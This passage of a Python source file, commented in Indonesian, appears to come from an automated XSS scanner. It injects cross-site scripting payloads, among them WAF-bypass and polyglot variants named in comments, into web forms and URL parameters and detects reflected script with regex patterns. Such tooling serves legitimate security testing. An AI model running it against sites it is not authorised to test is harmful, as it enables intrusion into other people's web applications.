            r'<code[^>]*onmouseenter[^>]*(?:alert|prompt)',
            r'<code[^>]*onmouseleave[^>]*(?:alert|prompt)',
            r'<code[^>]*onmousemove[^>]*(?:alert|prompt)',
            r'<code[^>]*onmouseout[^>]*(?:alert|prompt)',
            r'<code[^>]*onmouseover[^>]*(?:alert|prompt)',
            r'<code[^>]*onmouseup[^>]*(?:alert|prompt)',
            r'<code[^>]*onpaste[^>]*(?:alert|prompt)'
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, f"XSS pattern detected: {pattern[:50]}..."
        
        return False, ""
    
    def test_form_inputs(self, page: Page, form_locator: Locator) -> List[XSSResult]:
        """Test XSS pada form inputs dengan payload yang lebih strategis"""
        results = []
        
        try:
            # Ambil semua input dalam form
            inputs = form_locator.locator('input[type="text"], input[type="password"], textarea').all()
            
            for input_elem in inputs:
                input_name = input_elem.get_attribute('name') or 'unnamed'
                
                # Test dengan payload strategis (bukan semua payload)
                strategic_payloads = [
                    self.payloads[0],   # Basic Script
                    self.payloads[7],  # Image onerror
                    self.payloads[13],  # SVG onload
                    self.payloads[20],  # Case Variation
                    self.payloads[25],  # HTML Entity
                    self.payloads[30],  # WAF Bypass 1
                    self.payloads[33],  # Polyglot
                    self.payloads[36],  # Data URI
                ]
                
                for payload_obj in strategic_payloads:
                    try:
                        # Wait for element to be visible and enabled
                        input_elem.wait_for(state="visible", timeout=5000)
                        input_elem.clear()
                        input_elem.fill(payload_obj.payload)
                        
                        # Submit form
                        submit_btn = form_locator.locator('input[type="submit"], button[type="submit"]').first
                        if submit_btn.count() > 0:
                            submit_btn.click()
                            page.wait_for_timeout(2000)
                        
                        # Ambil response
                        response_text = page.content()
                        
                        # Deteksi XSS
                        is_vulnerable, snippet = self.detect_xss_in_response(response_text, payload_obj.payload)
                        
                        # Cek apakah payload muncul dalam response untuk debugging
                        payload_found = payload_obj.payload in response_text
                        payload_position = response_text.find(payload_obj.payload) if payload_found else -1
                        
                        result = XSSResult(
                            input_name=input_name,
                            payload=payload_obj.payload,
                            is_vulnerable=is_vulnerable,
                            response_snippet=snippet[:200] if snippet else "",
                            risk_level=payload_obj.risk_level
                        )
                        
                        # Tambahkan informasi debugging
                        result_dict = result.to_dict()
                        result_dict['payload_found_in_response'] = payload_found
                        result_dict['payload_position'] = payload_position
                        result_dict['response_length'] = len(response_text)
                        
                        # Jika payload ditemukan, ambil context sekitar payload
                        if payload_found and payload_position >= 0:
                            start = max(0, payload_position - 100)
                            end = min(len(response_text), payload_position + len(payload_obj.payload) + 100)
                            result_dict['payload_context'] = response_text[start:end]
                        
                        results.append(result.to_dict())
                        
                        # Jika ditemukan vulnerability, lanjut ke payload berikutnya
                        if is_vulnerable:
                            break
                            
                    except Exception as e:
                        print(f"Error testing {input_name} with {payload_obj.name}: {e}")
                        continue
        
        except Exception as e:
            print(f"Error in XSS form testing: {e}")
        
        return results
    
    def test_url_parameters(self, page: Page, url: str) -> List[Dict[str, Any]]:
        """Test XSS pada URL parameters"""
        results = []
        
        try:
            # Parse URL untuk mendapatkan parameters
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                return results
            
            # Test setiap parameter dengan payload strategis
            strategic_payloads = [
                self.payloads[0],   # Basic Script
                self.payloads[7],   # Image onerror
                self.payloads[13],  # SVG onload
                self.payloads[20],  # Case Variation
                self.payloads[25],  # HTML Entity
                self.payloads[30],  # WAF Bypass 1
                self.payloads[33],  # Polyglot
                self.payloads[36],  # Data URI
            ]
            
            for param_name, param_values in params.items():
                for payload_obj in strategic_payloads:
                    try:
                        # Buat URL dengan payload
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{param_name}={payload_obj.payload}"
                        
                        # Navigate ke URL dengan payload
                        page.goto(test_url)
                        page.wait_for_load_state('networkidle')
                        
                        # Ambil response
                        response_text = page.content()
                        
                        # Deteksi XSS
                        is_vulnerable, snippet = self.detect_xss_in_response(response_text, payload_obj.payload)
                        
                        result = {
                            'parameter_name': param_name,
                            'payload': payload_obj.payload,
                            'is_vulnerable': is_vulnerable,
                            'response_snippet': snippet[:200] if snippet else "",
                            'risk_level': payload_obj.risk_level,
                            'test_url': test_url
                        }
                        
                        results.append(result)
                        
                        # Jika ditemukan vulnerability, lanjut ke payload berikutnya
                        if is_vulnerable:
                            break
                            
                    except Exception as e:
                        print(f"Error testing parameter {param_name} with {payload_obj.name}: {e}")
                        continue
        
        except Exception as e:
            print(f"Error in XSS URL parameter testing: {e}")
        
        return results

    def run_xss_test(self, page: Page, url: str) -> Dict[str, Any]:
        """Jalankan XSS test pada halaman"""
        results = {
            'url': url,
            'form_tests': [],
            'url_parameter_tests': [],
            'summary': {
                'total_tests': 0,
                'vulnerabilities_found': 0,
                'high_vulnerabilities': 0,
                'critical_vulnerabilities': 0
            }
        }
        
        try:
            page.goto(url)
            page.wait_for_load_state('networkidle')
            
            # Test semua form
            forms = page.locator('form').all()
            for form in forms:
                form_results = self.test_form_inputs(page, form)
                results['form_tests'].extend(form_results)
            
            # Test URL parameters
            url_results = self.test_url_parameters(page, url)
            results['url_parameter_tests'].extend(url_results)
            
            # Calculate summary
            all_results = results['form_tests'] + results['url_parameter_tests']
            results['summary']['total_tests'] = len(all_results)
            results['summary']['vulnerabilities_found'] = len([r for r in all_results if r.get('is_vulnerable', False)])
            results['summary']['high_vulnerabilities'] = len([r for r in all_results if r.get('is_vulnerable', False) and r.get('risk_level') == 'high'])
            results['summary']['critical_vulnerabilities'] = len([r for r in all_results if r.get('is_vulnerable', False) and r.get('risk_level') == 'critical'])
        
        except Exception as e:
            results['error'] = str(e)
        
        return results